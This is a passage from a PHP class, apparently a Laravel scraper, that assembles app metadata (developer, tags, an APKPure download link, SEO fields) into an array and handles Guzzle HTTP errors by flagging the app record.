                'developer'     => $developerContent,
                'developer_url' => $developerUrlContent,

                'tags'        => $tagArray,

                'versions' => [
                    [
                        'identifier'       => trim($latestVersion),
                        'download_link'    => $this->apkPureUrl.$downloadUrl,
                        'is_link_external' => 1,
                    ]
                ],

                'more_details'    => $moreDetailArray,
                'seo_title'       => str_limit( trim(strip_tags($appTitle)), 160),
                'seo_keyword'     => $metaKeywordContent,
                'seo_description' => $metaDescriptionContent,
            ];
            // dd($detailArray);
            return $detailArray;


        } catch (GuzzleException $e) {

            if ($e instanceof ClientException && $e->hasResponse()) {

                $appModel = app(\App\App\Eloquent\Entities\App::class);
                $model = $appModel->byAppId($appId)->first();
                if ($model) {
                    $model->is_cron_check = 0;
                    $model->save();
                }
                // appId
                // throw new Exception($e->getResponse()->getReasonPhrase(), 3);
            }
            else
                throw new Exception($e->getMessage(), 3);
        }
    }
}